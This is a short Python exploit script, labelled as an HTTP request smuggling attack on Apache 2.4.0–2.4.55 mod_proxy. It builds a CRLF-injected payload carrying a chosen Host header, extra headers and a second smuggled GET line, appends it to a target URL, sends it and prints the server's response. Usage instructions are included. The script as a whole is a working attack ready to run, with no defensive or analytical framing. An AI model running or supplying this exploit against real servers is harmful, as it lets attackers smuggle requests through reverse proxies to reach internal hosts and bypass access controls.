#!/bin/python3
 
# HTTP Request Smuggling attack in Apache 2.4.0-2.4.55 (mod_proxy)

import requests
import sys
import urllib.parse

if len(sys.argv) < 3:
    print("[-] Arguments required!")
    print(f"[!] Usage: \tpython3 {sys.argv[0]} <URL> <SmugglingHostHeader> <SmugglingOtherHeaders>")
    print(f"    Es.\t\tpython3 {sys.argv[0]} http://example.local/info dev.local \"User-Agent: example\"")
    exit()

url = sys.argv[1]
host = sys.argv[2]

print(f"[+] Creating the payload...")
PAYLOAD = f' HTTP/1.1\r\nHost: {host}'
for index in range(len(sys.argv) - 3):
    header = sys.argv[index+3]
    PAYLOAD += f'\r\n{header}'
PAYLOAD += f'\r\n\r\nGET /HTTP/1.1'

print(f"[+] Payload encoded: \n{urllib.parse.quote(PAYLOAD)}")
print(f"[+] Smuggling Requests: \nGET {urllib.parse.urlparse(url).path} {PAYLOAD}\n...")

print(f"[+] Sending request...")
r = requests.get(url + PAYLOAD)

print(f"[!] Response status code: {r.status_code}")

if r.status_code == 200:
    print(f"[+] Response body: \n\n{r.text}")
